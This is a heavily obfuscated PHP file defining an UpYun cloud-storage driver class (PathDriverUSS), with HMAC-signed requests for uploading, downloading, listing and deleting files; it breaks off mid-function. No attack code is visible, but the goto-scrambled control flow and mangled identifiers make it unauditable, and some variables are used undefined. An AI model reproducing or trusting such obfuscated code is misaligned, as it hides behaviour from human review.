<?php
 goto Bâ¸Ûğ•áç; a±‚½Ã¶: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\57\57\166\60\56\141\x70\x69\56\165\x70\171\x75\x6e\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e¬ËËĞãµÍ) { parent::__construct(); $this->_init($e¬ËËĞãµÍ); } public function _init($eõÛƒèÌö†) { foreach ($eõÛƒèÌö† as $BÇĞ‡ÂÜÇ¦ => $EÑë‰¸¶‚“) { if (isset($this->{$BÇĞ‡ÂÜÇ¦})) { $this->{$BÇĞ‡ÂÜÇ¦} = $EÑë‰¸¶‚“; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[ÚŠ•´ÍéÒÑÔ][1228], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($FˆãˆİÀç‚, $BÊ Û™¹Œ‘ = "\107\105\124") { $CŞØÂÕ–Æ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÙÍŒ¶×§ = gmdate($CŞØÂÕ–Æ[1192]); $eÜßæÈƒÜå = base64_encode(hash_hmac($CŞØÂÕ–Æ[1229], "{$BÊ Û™¹Œ‘}\x26{$FˆãˆİÀç‚}\x26{$AÙÍŒ¶×§}", md5("{$this->userpass}"), !0)); $eî¨¿ëÀÛ‚ = array("\x41\165\x74\x68\x6f\x72\x69\x7a\x61\164\x69\x6f\x6e\72\125\x50\x59\x55\116\40{$this->username}\72{$eÜßæÈƒÜå}", "\x44\x61\164\145\x3a{$AÙÍŒ¶×§}"); return $eî¨¿ëÀÛ‚; } public function ussRequest($CñÆÚªÂà¾, $Cˆ«Ë„„Ò» = "\x47\105\x54", $CŒê±ø¦ŸŒ = false, $cÖ‡åš¼Ş­ = false, $FåŸ¨»²ÏÚ = false) { goto F–×ù¤µ°¤; F–×ù¤µ°¤: $B‰µŞ»¤‹Ô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CñÆÚªÂà¾ = trim($CñÆÚªÂà¾, $B‰µŞ»¤‹Ô[8]); $Fô›áÕØå = "\x2f{$this->bucket}\x2f{$CñÆÚªÂà¾}"; goto C¥ŒÆ‘ÇŒ; C¥ŒÆ‘ÇŒ: $d–İÍÌª = $this->ussHeaders($Fô›áÕØå, $Cˆ«Ë„„Ò»); if ($cÖ‡åš¼Ş­) { $d–İÍÌª = array_merge($d–İÍÌª, $cÖ‡åš¼Ş­); } $B·®„©²‰ö = url_request($this->endpoint . $Fô›áÕØå, $Cˆ«Ë„„Ò», $CŒê±ø¦ŸŒ, $d–İÍÌª, $FåŸ¨»²ÏÚ); goto c´¯¸´ÎÉ‘; c´¯¸´ÎÉ‘: if (!$B·®„©²‰ö) { return array($B‰µŞ»¤‹Ô[1024] => !1, $B‰µŞ»¤‹Ô[1026] => $B‰µŞ»¤‹Ô[1230]); } if (strtolower($Cˆ«Ë„„Ò») == $B‰µŞ»¤‹Ô[181] || in_array($B·®„©²‰ö[$B‰µŞ»¤‹Ô[1024]], array($B‰µŞ»¤‹Ô[1085], $B‰µŞ»¤‹Ô[1231]))) { $CŒê±ø¦ŸŒ = $B·®„©²‰ö[$B‰µŞ»¤‹Ô[1232]]; } else { $CŒê±ø¦ŸŒ = json_decode($B·®„©²‰ö[$B‰µŞ»¤‹Ô[1026]], !0); if (!$CŒê±ø¦ŸŒ) { $CŒê±ø¦ŸŒ = $B·®„©²‰ö[$B‰µŞ»¤‹Ô[1026]]; } else { if (!$B·®„©²‰ö[$B‰µŞ»¤‹Ô[684]] && isset($CŒê±ø¦ŸŒ[$B‰µŞ»¤‹Ô[1233]])) { $CŒê±ø¦ŸŒ = $CŒê±ø¦ŸŒ[$B‰µŞ»¤‹Ô[1233]]; } } } return array($B‰µŞ»¤‹Ô[1024] => $B·®„©²‰ö[$B‰µŞ»¤‹Ô[684]], $B‰µŞ»¤‹Ô[1026] => $CŒê±ø¦ŸŒ); goto fÈ §Æ†‘; fÈ §Æ†‘: } public function mkfile($eêåìÂ„†, $dŠÆÙ•£É = '', $Fßå±ªìª = REPEAT_RENAME) { if ($this->setContent($eêåìÂ„†, $dŠÆÙ•£É)) { return $this->getPathOuter($eêåìÂ„†); } return !1; } public function mkdir($aŸâ‘±¼–×, $FÆ×„ï‹ö” = REPEAT_SKIP) { $Eº‚®âÕÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Dñğæ‹›º = trim($aŸâ‘±¼–×, $Eº‚®âÕÒ[8]); if ($this->_isFolder($Dñğæ‹›º)) { return $this->getPathOuter($Dñğæ‹›º); } $E…×ÀôÔ¸á = array($Eº‚®âÕÒ[1234]); $eˆ¬™Ëæ®» = $this->ussRequest($Dñğæ‹›º, $Eº‚®âÕÒ[209], !1, $E…×ÀôÔ¸á); return $eˆ¬™Ëæ®»[$Eº‚®âÕÒ[1024]] ? $this->getPathOuter($Dñğæ‹›º) : !1; } public function copyFile($dÄÓ²…¾¹ë, $Cò’òš¶¤Ÿ) { $Aá‡õ¿‚Ï¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B®Šä¹¬‹ = array($Aá‡õ¿‚Ï¯[1235] . "\x2f{$this->bucket}\x2f{$dÄÓ²…¾¹ë}", $Aá‡õ¿‚Ï¯[1236]); $F¼ÔÔÛäÜ = $this->ussRequest($Cò’òš¶¤Ÿ, $Aá‡õ¿‚Ï¯[211], !1, $B®Šä¹¬‹); return $F¼ÔÔÛäÜ[$Aá‡õ¿‚Ï¯[1024]] ? !0 : !1; } public function moveFile($C„Şƒ¦Ö±Ë, $câ´–ò™¤‹) { $f´¡´ªïëŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¸ËØôŒÃ“ = array($f´¡´ªïëŠ[1237] . "\57{$this->bucket}\57{$C„Şƒ¦Ö±Ë}", $f´¡´ªïëŠ[1236]); $eƒÊæ¤‹øÏ = $this->ussRequest($câ´–ò™¤‹, $f´¡´ªïëŠ[211], !1, $e¸ËØôŒÃ“); return $eƒÊæ¤‹øÏ[$f´¡´ªïëŠ[1024]] ? !0 : !1; } public function delFile($cˆ³ßñ¡ §) { $eöÄÍßÔ×ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÚ±„õ…­í = $this->ussRequest($cˆ³ßñ¡ §, $eöÄÍßÔ×ö[1238]); return $aÚ±„õ…­í[$eöÄÍßÔ×ö[1024]] ? !0 : !1; } public function delFolder($E®ñ•öî”) { $fª¡ğÉ‘¤‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cëœŞ…Šƒ‰ = $this->listAll($E®ñ•öî”); krsort($cëœŞ…Šƒ‰); foreach ($cëœŞ…Šƒ‰ as $AµÅ»ôĞóÇ) { $this->ussRequest($AµÅ»ôĞóÇ[$fª¡ğÉ‘¤‰[75]], $fª¡ğÉ‘¤‰[1238]); } return $this->ussRequest($E®ñ•öî”, $fª¡ğÉ‘¤‰[1238]); } public function rename($FÜÔ’•¤», $c™¾»è¹²Ñ) { if ($this->isFile($FÜÔ’•¤»)) { $c™¾»è¹²Ñ = get_path_father($FÜÔ’•¤») . $c™¾»è¹²Ñ; return $this->moveFile($FÜÔ’•¤», $c™¾»è¹²Ñ); } return $this->renameObject($FÜÔ’•¤», $c™¾»è¹²Ñ); } public function fileInfo($c…™™©Óé, $bã«ÔÏì· = false, $aÅ‡ë×Èöå = array()) { $c‚ñ¸Û¸å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($bã«ÔÏì·) { return array($c‚ñ¸Û¸å[28] => $this->pathThis($c…™™©Óé), $c‚ñ¸Û¸å[75] => $this->getPathOuter($c‚ñ¸Û¸å[8] . $c…™™©Óé), $c‚ñ¸Û¸å[29] => $c‚ñ¸Û¸å[164], $c‚ñ¸Û¸å[77] => isset($aÅ‡ë×Èöå[$c‚ñ¸Û¸å[322]]) ? $aÅ‡ë×Èöå[$c‚ñ¸Û¸å[322]] : 0, $c‚ñ¸Û¸å[157] => $this->ext($c…™™©Óé)); } $Dã‚ Ğ•´¥ = array($c‚ñ¸Û¸å[28] => $this->pathThis($c…™™©Óé), $c‚ñ¸Û¸å[75] => $this->getPathOuter($c‚ñ¸Û¸å[8] . $c…™™©Óé), $c‚ñ¸Û¸å[29] => $c‚ñ¸Û¸å[164], $c‚ñ¸Û¸å[184] => 0, $c‚ñ¸Û¸å[107] => isset($A£’Ã¾ÄË·[$c‚ñ¸Û¸å[1239]]) ? $A£’Ã¾ÄË·[$c‚ñ¸Û¸å[1239]] : 0, $c‚ñ¸Û¸å[77] => isset($aÅ‡ë×Èöå[$c‚ñ¸Û¸å[322]]) ? $aÅ‡ë×Èöå[$c‚ñ¸Û¸å[322]] : 0, $c‚ñ¸Û¸å[157] => $this->ext($c…™™©Óé), $c‚ñ¸Û¸å[185] => !0, $c‚ñ¸Û¸å[186] => !0); if (empty($aÅ‡ë×Èöå)) { $aÅ‡ë×Èöå = $this->objectMeta($c…™™©Óé); if (!$aÅ‡ë×Èöå) { return $Dã‚ Ğ•´¥; } $Dã‚ Ğ•´¥[$c‚ñ¸Û¸å[184]] = $aÅ‡ë×Èöå[$c‚ñ¸Û¸å[1240]]; $Dã‚ Ğ•´¥[$c‚ñ¸Û¸å[107]] = $aÅ‡ë×Èöå[$c‚ñ¸Û¸å[1241]]; $Dã‚ Ğ•´¥[$c‚ñ¸Û¸å[77]] = $aÅ‡ë×Èöå[$c‚ñ¸Û¸å[77]]; } return $Dã‚ Ğ•´¥; } public function folderInfo($c…É©¬¾ì­, $b™’ˆÓÄªÂ = false) { $a¬¿Ä§ ˜Ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($b™’ˆÓÄªÂ) { return array($a¬¿Ä§ ˜Ç[28] => $this->pathThis($c…É©¬¾ì­), $a¬¿Ä§ ˜Ç[75] => $this->getPathOuter($a¬¿Ä§ ˜Ç[8] . $c…É©¬¾ì­), $a¬¿Ä§ ˜Ç[29] => $a¬¿Ä§ ˜Ç[76]); } $fá¿Şº´· = array($a¬¿Ä§ ˜Ç[28] => $this->pathThis($c…É©¬¾ì­), $a¬¿Ä§ ˜Ç[75] => $this->getPathOuter($a¬¿Ä§ ˜Ç[8] . $c…É©¬¾ì­), $a¬¿Ä§ ˜Ç[29] => $a¬¿Ä§ ˜Ç[76], $a¬¿Ä§ ˜Ç[184] => 0, $a¬¿Ä§ ˜Ç[107] => isset($dø±ïÓ…[$a¬¿Ä§ ˜Ç[1239]]) ? $dø±ïÓ…[$a¬¿Ä§ ˜Ç[1239]] : 0, $a¬¿Ä§ ˜Ç[1146] => !0, $a¬¿Ä§ ˜Ç[1147] => !0); if (empty($eà³”­ìÂÉ)) { $eà³”­ìÂÉ = $this->objectMeta($c…É©¬¾ì­); if (!$eà³”­ìÂÉ) { return $fá¿Şº´·; } $fá¿Şº´·[$a¬¿Ä§ ˜Ç[184]] = $eà³”­ìÂÉ[$a¬¿Ä§ ˜Ç[1240]]; $fá¿Şº´·[$a¬¿Ä§ ˜Ç[107]] = $eà³”­ìÂÉ[$a¬¿Ä§ ˜Ç[1241]]; } return $fá¿Şº´·; } private function fileList($BÀÊªèÌˆ‰, $Fñ˜°ˆğğÖ = 0, $dê¶Õæ×²† = 1000) { $a¬¡ç¹”Ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f´µ‚¥¹¶— = array($a¬¡ç¹”Ö[1242], $a¬¡ç¹”Ö[1243] . $dê¶Õæ×²†); if ($Fñ˜°ˆğğÖ) { $f´µ‚¥¹¶—[] = $a¬¡ç¹”Ö[1244] . $Fñ˜°ˆğğÖ; } $E‹Òß‰Ã»¿ = $this->ussRequest($BÀÊªèÌˆ‰, $a¬¡ç¹”Ö[213], !1, $f´µ‚¥¹¶—); return !$E‹Òß‰Ã»¿[$a¬¡ç¹”Ö[1024]] ? !1 : $E‹Òß‰Ã»¿[$a¬¡ç¹”Ö[1026]]; } public function listPath($f†áÎŠ¶„İ, $bÀÊÌœ‹ŒÀ = false) { goto Eğ¢×Ğ×Œ™; Eğ¢×Ğ×Œ™: $b÷²•¡×¿œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f˜ÈîÔ°â = $b÷²•¡×¿œ[33]; $d–ôÓˆÛª = 1000; goto Fº¦Ûğõå§; eÃè¨¬ëƒª: return array($b÷²•¡×¿œ[74] => $Dï…£ª£†ï, $b÷²•¡×¿œ[73] => $Bø¬İ‘ÖŠË); goto b™¥ĞºÓ•¦; Fº¦Ûğõå§: $Dï…£ª£†ï = $Bø¬İ‘ÖŠË = array(); $FœğôÂìÔí = rtrim($f†áÎŠ¶„İ, $b÷²•¡×¿œ[8]) . $b÷²•¡×¿œ[8]; while (!0) { $Fä‘§ÑâŒ = $this->fileList($f†áÎŠ¶„İ, $f˜ÈîÔ°â, $d–ôÓˆÛª); if (!$Fä‘§ÑâŒ) { return !1; } $f˜ÈîÔ°â = isset($Fä‘§ÑâŒ[$b÷²•¡×¿œ[1245]]) ? $Fä‘§ÑâŒ[$b÷²•¡×¿œ[1245]] : $b÷²•¡×¿œ[33]; $eÌğŠ©†åÆ = isset($Fä‘§ÑâŒ[$b÷²•¡×¿œ[1246]]) ? $Fä‘§ÑâŒ[$b÷²•¡×¿œ[1246]] : array(); foreach ($eÌğŠ©†åÆ as $BìÔÆŞ‘¬ô) { if ($BìÔÆŞ‘¬ô[$b÷²•¡×¿œ[29]] == $b÷²•¡×¿œ[76]) { $Dï…£ª£†ï[] = $this->folderInfo($FœğôÂìÔí . $BìÔÆŞ‘¬ô[$b÷²•¡×¿œ[28]], $bÀÊÌœ‹ŒÀ, $BìÔÆŞ‘¬ô); } else { $Bø¬İ‘ÖŠË[] = $this->fileInfo($FœğôÂìÔí . $BìÔÆŞ‘¬ô[$b÷²•¡×¿œ[28]], $bÀÊÌœ‹ŒÀ, $BìÔÆŞ‘¬ô); } } if (count($eÌğŠ©†åÆ) < $d–ôÓˆÛª) { break; } } goto eÃè¨¬ëƒª; b™¥ĞºÓ•¦: } private function recursionAllFiles($b‹ì‹•¡ˆ, &$dˆ×ãÂæÚ) { $C‘ÖÈÀÅî =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‰›ë¹èá¦ = $C‘ÖÈÀÅî[33]; $E‰òêæë¸ = 1000; $B­±¼•©„ = $f¹â»š£ = array(); $EÎ‘­÷…°¬ = rtrim($b‹ì‹•¡ˆ, $C‘ÖÈÀÅî[8]) . $C‘ÖÈÀÅî[8]; while (!0) { $C“…·åì‡ = $this->fileList($b‹ì‹•¡ˆ, $F‰›ë¹èá¦, $E‰òêæë¸); if (!$C“…·åì‡) { return !1; } $F‰›ë¹èá¦ = isset($C“…·åì‡[$C‘ÖÈÀÅî[1245]]) ? $C“…·åì‡[$C‘ÖÈÀÅî[1245]] : $C‘ÖÈÀÅî[33]; $A³¥„ÖøÉ = isset($C“…·åì‡[$C‘ÖÈÀÅî[1246]]) ? $C“…·åì‡[$C‘ÖÈÀÅî[1246]] : array(); foreach ($A³¥„ÖøÉ as $BòØ‚­Š©) { $b„†‡Ò‘˜İ = array($C‘ÖÈÀÅî[75] => $EÎ‘­÷…°¬ . $BòØ‚­Š©[$C‘ÖÈÀÅî[28]], $C‘ÖÈÀÅî[76] => $BòØ‚­Š©[$C‘ÖÈÀÅî[29]] == $C‘ÖÈÀÅî[76] ? 1 : 0, $C‘ÖÈÀÅî[77] => isset($BòØ‚­Š©[$C‘ÖÈÀÅî[322]]) ? $BòØ‚­Š©[$C‘ÖÈÀÅî[322]] : 0); $dˆ×ãÂæÚ[] = $b„†‡Ò‘˜İ; if ($b„†‡Ò‘˜İ[$C‘ÖÈÀÅî[76]] == 1) { $this->recursionAllFiles($b„†‡Ò‘˜İ[$C‘ÖÈÀÅî[75]], $dˆ×ãÂæÚ); } } if (count($A³¥„ÖøÉ) < $E‰òêæë¸) { break; } } } public function has($d½Ãèß¿×Ÿ, $cŞ Õ•Š× = false, $F²¯çÂïŒ = true) { goto Aä‘Ğ”¹ ë; b÷†‘ïÅÉ»: $a ‘¤çêÔœ = 0; $díŞÄ»öÙˆ = 0; $AÊìã‚Ø = rtrim($d½Ãèß¿×Ÿ, $Dá¸‘¿Ãä[8]) . $Dá¸‘¿Ãä[8]; goto C¦Ï™ä¡åî; C¦Ï™ä¡åî: while (!0) { $c—­ÒÃÓ›‹ = $this->fileList($d½Ãèß¿×Ÿ, $dÅõÖÌ¶šÑ, $cÃß¡ºº†); if (!$c—­ÒÃÓ›‹) { return !1; } $dÅõÖÌ¶šÑ = isset($c—­ÒÃÓ›‹[$Dá¸‘¿Ãä[1245]]) ? $c—­ÒÃÓ›‹[$Dá¸‘¿Ãä[1245]] : $Dá¸‘¿Ãä[33]; $CŸòÀğëæ¬ = isset($c—­ÒÃÓ›‹[$Dá¸‘¿Ãä[1246]]) ? $c—­ÒÃÓ›‹[$Dá¸‘¿Ãä[1246]] : array(); if (empty($CŸòÀğëæ¬)) { break; } $dø‚éÎöç = array_to_keyvalue($CŸòÀğëæ¬, $Dá¸‘¿Ãä[33], $Dá¸‘¿Ãä[29]); $d°ãÕ¬ºŒª = array_count_values($dø‚éÎöç); $fŠ³­Ãöá• = isset($d°ãÕ¬ºŒª[$Dá¸‘¿Ãä[76]]) ? $d°ãÕ¬ºŒª[$Dá¸‘¿Ãä[76]] : 0; $f¤áÑ‘°³· = count($dø‚éÎöç) - $fŠ³­Ãöá•; if ($cŞ Õ•Š×) { $díŞÄ»öÙˆ += $fŠ³­Ãöá•; $a ‘¤çêÔœ += $f¤áÑ‘°³·; if ($A²ÂâÀÜÍ < $cÃß¡ºº†) { break; } continue; } if ($F²¯çÂïŒ) { if ($f¤áÑ‘°³·) { return !0; } } else { if ($fŠ³­Ãöá•) { return !0; } } if (count($CŸòÀğëæ¬) < $cÃß¡ºº†) { break; } } if ($cŞ Õ•Š×) { return array($Dá¸‘¿Ãä[188] => $a ‘¤çêÔœ, $Dá¸‘¿Ãä[189] => $díŞÄ»öÙˆ); } return !1; goto aƒƒ²–³Ã§; Aä‘Ğ”¹ ë: $Dá¸‘¿Ãä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÅõÖÌ¶šÑ = $Dá¸‘¿Ãä[33]; $cÃß¡ºº† = 1000; goto b÷†‘ïÅÉ»; aƒƒ²–³Ã§: } public function listAll($BãÙÉÍ±£Ö) { $a”İ¤†Ë‘´ = array(); $this->recursionAllFiles($BãÙÉÍ±£Ö, $a”İ¤†Ë‘´); return $a”İ¤†Ë‘´; } public function canRead($Bô˜ÙÍ˜ˆ) { return $this->exist($Bô˜ÙÍ˜ˆ) ? !0 : !1; } public function canWrite($B‘­¶âºÈ±) { return $this->exist($B‘­¶âºÈ±) ? !0 : !1; } public function getContent($Bïçğ›®Õã) { return $this->fileSubstr($Bïçğ›®Õã, 0, -1); } public function setContent($d’„×ë÷¶°, $c‚‚„¿ø¦¶ = '') { $bÏ®Î‚ˆ‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$c‚‚„¿ø¦¶) { $DÊÓ§øò¶¹ = $this->ussRequest($d’„×ë÷¶°, $bÏ®Î‚ˆ‹[209]); return $DÊÓ§øò¶¹[$bÏ®Î‚ˆ‹[1024]]; } $Eø¸¿ğïõÔ = $this->tempFile($this->pathThis($d’„×ë÷¶°)); file_put_contents($Eø¸¿ğïõÔ, $c‚‚„¿ø¦¶); if ($this->upload($d’„×ë÷¶°, $Eø¸¿ğïõÔ)) { $this->tempFileRemve($Eø¸¿ğïõÔ); return !0; } return !1; } public function fileSubstr($BÅ«Å³†íŞ, $dïÕ½‚ööƒ, $FßïŠ‹Òë®) { $aªÌËø©Ø— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!($d›ç¦‡‰µ = $this->link($BÅ«Å³†íŞ))) { return !1; } $aã†–»‘ö = !1; if ($FßïŠ‹Òë® > 0) { $DÆËÆ¶¸ª÷ = $dïÕ½‚ööƒ + $FßïŠ‹Òë® - 1; $aã†–»‘ö = array($aªÌËø©Ø—[1207] . $dïÕ½‚ööƒ . $aªÌËø©Ø—[408] . $DÆËÆ¶¸ª÷); } $aµæè¨ïå = url_request($d›ç¦‡‰µ, $aªÌËø©Ø—[213], !1, $aã†–»‘ö); return $aµæè¨ïå[$aªÌËø©Ø—[684]] ? $aµæè¨ïå[$aªÌËø©Ø—[1026]] : !1; } public function upload($EÖŠ²Æéò, $C¦¸ºÁƒ·, $d¸˜–µà—˜ = false, $d”¬«Ÿ§ÁÖ = REPEAT_REPLACE) { goto AÙ¿Áº¬î; AÙ¿Áº¬î: $FíĞµÊàŞÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a£ß™ïÈ§ö = IO::size($C¦¸ºÁƒ·); if ($a£ß™ïÈ§ö <= 1024 * 1024 * 200) { $D ‡™£†Â = array($FíĞµÊàŞÏ[1247] . $C¦¸ºÁƒ·); $a‰’—êÂß = $this->ussRequest($EÖŠ²Æéò, $FíĞµÊàŞÏ[211], $D ‡™£†Â); return $a‰’—êÂß[$FíĞµÊàŞÏ[1024]] ? $this->getPathOuter($EÖŠ²Æéò) : !1; } goto fÓ¥â¬‚«; D¾¡µ¸‘´Ø: if (!$fƒÌÀ¤çâ‚) { return !1; } do { $Bººèó¸•î = $BÂ‡ïñÙ[$FíĞµÊàŞÏ[1253]]; fseek($fƒÌÀ¤çâ‚, $C¬ô›Ÿ·§í); $e§ßÆ‰§Òµ = fread($fƒÌÀ¤çâ‚, $Bººèó¸•î); $EáÔöÍæ²š = 0; do { $EáÔöÍæ²š++; $BÂ‡ïñÙ = $this->uploadPart($EÖŠ²Æéò, $BÂ‡ïñÙ, $e§ßÆ‰§Òµ); } while (!$BÂ‡ïñÙ && $EáÔöÍæ²š < 3); if (!$BÂ‡ïñÙ) { return !1; } $AœääØ¢«ß = $BÂ‡ïñÙ[$FíĞµÊàŞÏ[1252]]; $C¬ô›Ÿ·§í += $Bººèó¸•î; } while ($AœääØ¢«ß != -1); fclose($fƒÌÀ¤çâ‚); goto CæŠÇä¤µÁ; cØÛ±•ª´Í: $a‰’—êÂß = $this->ussRequest($EÖŠ²Æéò, $FíĞµÊàŞÏ[211], !1, $f‚„‚Óšà); if (!$a‰’—êÂß[$FíĞµÊàŞÏ[1024]]) { return !1; } $BÂ‡ïñÙ = $a‰’—êÂß[$FíĞµÊàŞÏ[1026]]; goto dŒ³Ó·ì„«; dŒ³Ó·ì„«: $C¬ô›Ÿ·§í = 0; $AœääØ¢«ß = $BÂ‡ïñÙ[$FíĞµÊàŞÏ[1252]]; $fƒÌÀ¤çâ‚ = fopen($C¦¸ºÁƒ·, $FíĞµÊàŞÏ[1157]); goto D¾¡µ¸‘´Ø; CæŠÇä¤µÁ: $f‚„‚Óšà = array($FíĞµÊàŞÏ[1254], $FíĞµÊàŞÏ[1255] . $BÂ‡ïñÙ[$FíĞµÊàŞÏ[1256]], $FíĞµÊàŞÏ[1250]); $a‰’—êÂß = $this->ussRequest($EÖŠ²Æéò, $FíĞµÊàŞÏ[211], !1, $f‚„‚Óšà); return $a‰’—êÂß[$FíĞµÊàŞÏ[1024]] ? $this->getPathOuter($F©È’Ïğ†) : !1; goto AÅ¢ ˆ×; fÓ¥â¬‚«: $Eó“…„—·® = $this->osChunkSize(); if ($Eó“…„—·® > 1024 * 1024 * 10) { $Eó“…„—·® = 1024 * 1024 * 10; } $f‚„‚Óšà = array($FíĞµÊàŞÏ[1248], $FíĞµÊàŞÏ[1249] . $a£ß™ïÈ§ö, $FíĞµÊàŞÏ[1250], $FíĞµÊàŞÏ[1251] . $Eó“…„—·®); goto cØÛ±•ª´Í; AÅ¢ ˆ×: } private function uploadPart($A•»ÜÑƒ»æ, $a©ô¯²¨èá, &$EÖª¡»Šé) { $f¹¤·¯ÔŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D²Áİ„‘¼× = array($f¹¤·¯ÔŒ[1257], $f¹¤·¯ÔŒ[1255] . $a©ô¯²¨èá[$f¹¤·¯ÔŒ[1256]], $f¹¤·¯ÔŒ[1258] . $a©ô¯²¨èá[$f¹¤·¯ÔŒ[1252]], $f¹¤·¯ÔŒ[1259] . $a©ô¯²¨èá[$f¹¤·¯ÔŒ[1253]]); $EÒÕ×³´ = $this->ussRequest($A•»ÜÑƒ»æ, $f¹¤·¯ÔŒ[211], $EÖª¡»Šé, $D²Áİ„‘¼×); return !$EÒÕ×³´[$f¹¤·¯ÔŒ[1024]] ? $EÒÕ×³´[$f¹¤·¯ÔŒ[1024]] : $EÒÕ×³´[$f¹¤·¯ÔŒ[1026]]; } public function uploadFormData($eÅÌŠïÄÅ“, $BÍÎ¼ÛÆÚ = 3600) { return $this->uploadPolicy($eÅÌŠïÄÅ“, $BÍÎ¼ÛÆÚ); } public function multiUploadFormData($b¶ˆ‡÷¥, $aİÌš = 3600) { $DåÇÖÊ©‹ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÛá—çô‚ = (int) $GLOBALS[$DåÇÖÊ©‹ò[7]][$DåÇÖÊ©‹ò[77]]; return $this->uploadPolicy($b¶ˆ‡÷¥, $aİÌš, $EÛá—çô‚); } private function uploadPolicy($aŸ®ã÷”š•, $EÀÉêç¾™å = 3600, $Eâ„ø‡ÆŸ„ = 0) { goto BÏ»Ó˜™ÃŸ; E¬É½…Ê: $DÖí³±ºŒ½ = array($eğ‹Ù²îğ[1260] => $this->bucket, $eğ‹Ù²îğ[1261] => $aŸ®ã÷”š•, $eğ‹Ù²îğ[1262] => time() + $EÀÉêç¾™å, $eğ‹Ù²îğ[1263] => $AßÌæËÜîô); if ($Eâ„ø‡ÆŸ„) { $DÖí³±ºŒ½[$eğ‹Ù²îğ[1178]] = $Eâ„ø‡ÆŸ„; } $A»Ö­¸ÖÙõ = base64_encode(json_encode($DÖí³±ºŒ½)); goto föÒ£ŒŸ«ê; föÒ£ŒŸ«ê: $dÍ’Ì¤Â·Ğ = base64_encode(hash_hmac($eğ‹Ù²îğ[1229], "\120\117\x53\x54\x26{$CÕó—Ñµˆ}\46{$AßÌæËÜîô}\x26{$A»Ö­¸ÖÙõ}", md5("{$this->userpass}"), !0)); $fğ×„‚¶à = array($eğ‹Ù²îğ[1097] => $A»Ö­¸ÖÙõ, $eğ‹Ù²îğ[1264] => "\x55\120\131\x55\x4e\x20{$this->username}\x3a{$dÍ’Ì¤Â·Ğ}", $eğ‹Ù²îğ[166] => $this->endpoint . $CÕó—Ñµˆ); return $fğ×„‚¶à; goto dš·š–Ş´â; BÏ»Ó˜™ÃŸ: $eğ‹Ù²îğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÕó—Ñµˆ = $eğ‹Ù²îğ[8] . $this->bucket; $AßÌæËÜîô = gmdate($eğ‹Ù²îğ[1192]); goto E¬É½…Ê; dš·š–Ş´â: } public function download($bµãµÙÊ«, $c¼™ö¯Ìß²) { goto a×ƒâ‡…‘Ö; a×ƒâ‡…‘Ö: $b‡õùì½‘¥ = IO::getPathInner(IO::mkfile($c¼™ö¯Ìß²)); if (!($AÈåà÷î©ã = $this->link($bµãµÙÊ«))) { return !1; } $CªŞêò÷² = 0; goto fÜª»‡§’Ì; CÇ÷²œáº: fclose($D°ïÛÙÌŞ‘); return $c¼™ö¯Ìß²; goto Fó  ´ˆî; fÜª»‡§’Ì: $Aß ˆÅø­Â = 1024 * 200; $D°ïÛÙÌŞ‘ = fopen($b‡õùì½‘¥, $_SERVER[ÚŠ•´ÍéÒÑÔ][1213]); while (!0) { $e’§ÈÒÅÀ = $this->fileSubstr($bµãµÙÊ«, $CªŞêò÷², $Aß ˆÅø­Â); if ($e’§ÈÒÅÀ === !1) { return !1; } fwrite($D°ïÛÙÌŞ‘, $e’§ÈÒÅÀ); $CªŞêò÷² += $Aß ˆÅø­Â; if (strlen($e’§ÈÒÅÀ) < $Aß ˆÅø­Â) { break; } } goto CÇ÷²œáº; Fó  ´ˆî: } public function link($f‹¡–´ÈµØ, $aÇÈêÙùêõ = array()) { $EÉãƒİïÙÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f‹¡–´ÈµØ = trim($f‹¡–´ÈµØ, $EÉãƒİïÙÀ[8]); if (!empty($this->token)) { $eçŸ¯âÙ›˜ = strtotime(date($EÉãƒİïÙÀ[1265])); $d§™º„ù¦ë = substr(md5($this->token . $EÉãƒİïÙÀ[269] . $eçŸ¯âÙ›˜ . $EÉãƒİïÙÀ[1266] . $f‹¡–´ÈµØ), 12, 8) . $eçŸ¯âÙ›˜; $aÇÈêÙùêõ[] = $EÉãƒİïÙÀ[1267] . $d§™º„ù¦ë; } $cÍï‡ôáå› = !empty($aÇÈêÙùêõ) ? $EÉãƒİïÙÀ[69] . implode($EÉãƒİïÙÀ[269], $aÇÈêÙùêõ) : $EÉãƒİïÙÀ[33]; return $EÉãƒİïÙÀ[1100] . $this->domain . $EÉãƒİïÙÀ[8] . $f‹¡–´ÈµØ . $cÍï‡ôáå›; } public function fileOut($F¤èòËŒë, $Dö Ö±ù” = false, $eõ“Ùò = false, $B¬¡»–Úç÷ = '') { if (!$eõ“Ùò) { $eõ“Ùò = $this->pathThis($F¤èòËŒë); } $FÚˆÇµàâ… = $Dö Ö±ù” ? array($_SERVER[ÚŠ•´ÍéÒÑÔ][1268] . rawurlencode($eõ“Ùò)) : array(); $BÍ„ •Ñ¬µ = $this->link($F¤èòËŒë, $FÚˆÇµàâ…); $this->fileOutLink($BÍ„ •Ñ¬µ); } public function fileOutServer($CÑ•Ú†¹ùŠ, 